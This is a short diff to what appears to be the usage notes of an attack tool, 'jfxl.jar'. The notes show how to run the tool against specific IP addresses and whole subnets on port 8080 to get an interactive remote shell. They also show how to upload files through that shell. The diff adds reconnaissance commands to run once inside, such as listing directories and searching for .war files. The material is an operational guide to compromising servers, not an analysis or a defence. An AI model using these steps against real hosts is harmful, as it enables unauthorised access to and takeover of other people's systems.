@@ -6,5 +6,12 @@ java -jar jfxl.jar 119.17.248.52:8080 -i
 quit or exit out【退出】 the shell
 [file upload文件上传]
 put localFileName remouteFileName
+linux:
+pwd
+ls -la
+find . -name *.war
+windows:
+dir /s
+
 2、java -jar jfxl.jar 119.177.248.52-155:8080
 3、java -jar jfxl.jar 119.177.248.52/16:8080
